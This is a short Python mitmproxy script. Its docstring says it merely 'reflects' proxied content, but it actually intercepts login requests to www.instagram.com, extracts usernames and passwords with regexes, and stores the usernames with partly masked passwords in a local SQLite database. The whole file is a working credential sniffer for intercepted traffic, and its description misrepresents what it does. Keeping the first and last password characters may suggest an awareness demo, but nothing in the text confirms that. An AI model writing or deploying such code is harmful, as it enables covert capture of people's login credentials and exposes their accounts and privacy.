"""
This script reflects all content passing through the proxy.
"""

import re
import sqlite3
from mitmproxy import http

DB_PATH = '/tmp/instapwd.db'

def response(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_host == 'www.instagram.com':
        match_pwd = re.search(b'password=([^&]*)', flow.request.content)
        match_usr = re.search(b'username=([^&]*)', flow.request.content)

        if match_pwd and match_usr:
            usr = match_usr.group(1).decode()
            pwd = match_pwd.group(1).decode()
            priv_pwd = pwd[0] + '*' * (len(pwd) - 2) + pwd[-1] 

            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("INSERT INTO users VALUES (strftime('%s','now'), ?, ?, ?)", (flow.request.pretty_host, usr, priv_pwd))
